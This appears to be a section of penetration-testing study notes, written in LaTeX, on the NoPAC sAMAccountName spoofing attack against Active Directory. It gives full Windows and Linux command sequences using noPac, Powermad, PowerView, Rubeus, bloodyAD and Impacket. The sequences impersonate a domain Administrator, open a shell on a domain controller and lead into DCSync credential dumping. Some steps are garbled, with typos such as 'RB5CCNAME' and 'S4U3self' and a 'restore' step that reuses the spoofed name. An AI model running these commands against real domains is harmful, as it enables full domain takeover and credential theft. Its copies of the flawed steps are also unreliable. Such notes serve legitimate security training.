\section{SamAccountName spoofing (NoPAC)}

The NoPAC attack, commonly associated with the vulnerabilities CVE-2021-42278 and CVE-2021-42287, refers to a method where a Domain User can perform privilege escalation and impersonate any privilege account through what is known as {sAMAccountName Spoofing}.

\begin{itemize}
    \item \verb+CVE-2021-42278+, which exploits the lack of restrictions on modifications to the \verb+sAMAccountName+ attribute in Active Directory. By default, Windows Active Directory does not enforce strict validation of this attribute, particularly ensuring that computer account names end with a \verb+$+ sign to distinguish them from user accounts. When we have sufficient permissions on a machine account, we can change the \verb+sAMAccountName+ of that account to the name of a domain controller without the \verb+$+. This modification sets up the scenario for impersonating a domain controller.
    \item \verb+CVE-2021-42287+ is a vuln in the Key Distribution Center. The KDC is tricked during the Service Ticket request phase. When a Service Ticket is requested for a non-existent account, the KDC will append a \verb+$+ and search again.
\end{itemize}

The attack is s follow:
\begin{enumerate}
    \item
        \begin{itemize}
            \item For a user account clear the SPN and modify the \verb+sAMAccountName+ of an account (created computer possibly) to match (without \verb+$+) a machine account with at least contrained delegation
            \item For a computer account modify the \verb+sAMAccountName+ of an account (created computer possibly) to match (without \verb+$+) a machine account with at least contrained delegation
        \end{itemize}
    \item
        Request a Ticket Granting Ticket (TGT) using that account 
    \item 
        reset the original \verb+sAMAccountName+ 
    \item
        request a Service Ticket (S4U3self), the KDC fails to find the account and appends a \verb+$+ sign, unintentionally matching the targeted machine 
\end{enumerate}

\href{https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/166d8064-c863-41e1-9c23-edaaa5f36962}{[MS-PAC]: Privilege Attribute Certificate Data Structure}

Note: If the server is vulnerable to NoPAC, that doesn't mean that the sAMAccountName spoofing will work because it also needs to be able to rename the sAMAccountName to the DC to work, and that's only possible if the patch for CVE-2021-42278 is not applied.

\subsection{From Windows}

Check vuln using \href{https://github.com/cube0x0/noPac}{noPac}
\begin{verbatim}
.\noPac.exe scan -domain inlanefreight.local -user aneudy -pass Ilovemusic01
\end{verbatim}

Check Machine account quota
\begin{verbatim}
(Get-DomainObject -SearchScope Base)."ms-ds-machineaccountquota"

(Get-DomainComputer -Filter '(ms-DS-CreatorSID=*)' -Properties name,ms-ds-creatorsid | 
    Get-DomainComputer -Filter '(ms-DS-CreatorSID=*)' -Properties name,ms-ds-creatorsid).Count
\end{verbatim}

\begin{enumerate}
    \item 
    Create a computer account.
    \item 
    Clear the SPN attributes of the new computer account.
    \item 
    Abuse CVE-2021-42278 and modify the \verb+sAMAccountName+ of the computer to match the Domain Controller DC03 without \verb+$+.
    \item 
    Request a TGT for this computer with its credentials.
    \item 
    Revert the computer \verb+sAMAccountName+ to its original value.
    \item 
    Abuse CVE-2021-42287 and request a service ticket with S4U2self using the TGT.
\end{enumerate}
\begin{verbatim}
Import-Module .\Powermad.ps1
$password = ConvertTo-SecureString '<password|Jubeaz12345+->' -AsPlainText -Force
New-MachineAccount -MachineAccount "<computer_name|jubeaz>" -Password $($password) ` 
    -Domain inlanefreight.local -DomainController 172.18.88.10 -Verbose

Import-Module .\PowerView.ps1
Set-DomainObject -Identity 'TEST01$' -Clear 'serviceprincipalname'` 
    -Domain inlanefreight.local -DomainController 172.18.88.10 -Verbose

Set-DomainObject -Identity '<computer_name>$' -Clear 'serviceprincipalname' `
    -Domain inlanefreight.local -DomainController <dc_ip> -Verbose

# new_computer_name = dc_name
Set-MachineAccountAttribute -MachineAccount "<computer_name|jubeaz>" -Value "<new_computer_name>"`
    -Attribute samaccountname -Domain <domain_fqdn> -DomainController <dc_ip> -Verbose

.\Rubeus.exe asktgt /user:<user> /domain:<domain_fqdn> /rc4:<nt_hash> /nowrap

# restore
Set-MachineAccountAttribute -MachineAccount "<computer_name|jubeaz>" `
    -Value "<new_computer_name>" -Attribute samaccountname `
    -Domain <domain_fqdn> -DomainController <dc_ip> -Verbose

# Request a ticket using S4U2self
.\Rubeus.exe s4u /self /impersonateuser:Administrator `
    /altservice:"ldap/dc03.inlanefreight.local" `
    /dc:172.18.88.10 /ptt /ticket:doIFJDCCBSCgAwIBBa...SNIP...
\end{verbatim}

\subsection{From Linux}

\subsubsection{Manual}
\begin{verbatim}
BloodyAD.py -d inlanefreight.local -u aneudy -p Ilovemusic01 \
    --host 10.129.229.224 get object felipe | 
    grep "servicePrincipalName\|sAMAccountName"

# clear SPN
bloodyAD.py -d inlanefreight.local -u aneudy -p Ilovemusic01 \
    --host 10.129.229.224 set object felipe servicePrincipalName

# modify sAMAccountName
bloodyAD.py -d inlanefreight.local -u aneudy -p Ilovemusic01 \
    --host 10.129.229.224 set object felipe sAMAccountName -v DC03

# get TGT
getTGT.py inlanefreight.local/dc03:Hacker0039 -dc-ip 10.129.229.22

# reset sAMAccountName
bloodyAD.py -d inlanefreight.local -u aneudy -p Ilovemusic01 \
    --host 10.129.229.224 \
    set object "CN=felipe,CN=Users,DC=inlanefreight,DC=local" sAMAccountName -v felipe

# S4U2self
RB5CCNAME=dc03.ccache getST.py inlanefreight.local/dc03 \
    -self \
    -impersonate 'Administrator' \
    -altservice 'cifs/dc03.inlanefreight.local' -k -no-pass -dc-ip 10.129.229.224 
\end{verbatim}

\subsubsection{Automated (noPac.py)}
\href{https://github.com/Ridter/noPac}{noPac tool} allow to perform the attack and rely on Impacket.

\begin{verbatim}
    # Scanning for noPac
    sudo python3 scanner.py <domain_fqdn>/<user>:<password> -dc-ip <dc_ip> -use-ldap
    
    # Running NoPac & Getting a Shell
    sudo python3 noPac.py <domain_fqdn>/<user>:<password> -dc-ip <dc_ip> -dc-host <dc_fqdn> \
        -shell --impersonate administrator -use-ldap
    
    KRB5CCNAME=./<admin.ccache> psexec.py -no-pass -k <dc_fqdn>
    \end{verbatim}
    
    {\bf note}:
    \begin{itemize}
        \item a semi-interactive shell session is established with the target using
            smbexec.py.
        \item TGT are saved  in the directory on the attack host where the exploit was run.
    \end{itemize}
    
    Using the ccache file it is possible to perform a
    pass-the-ticket~\ref{kerberos:pth} and perform further attacks such as
    DCSync~\ref{kerberos:DCSync}. 
    
    It is possible with the \verb+-dump+ flag to perform a DCSync using
    \verb+secretsdump.py+. This method would still create a ccache file on disk.
    
    If Windows Defender (or another AV or EDR product) is enabled on a target, the
    shell session may be established, but issuing any commands will likely fail.
    The first thing smbexec.py does is create a service called BTOBTO. Another
    service called BTOBO is created, and any command typed is sent to the target
    over SMB inside a .bat file called execute.bat. With each new command typed, a
    new batch script is created and echoed to a temporary file that executes said
    script and deletes it from the system. 
    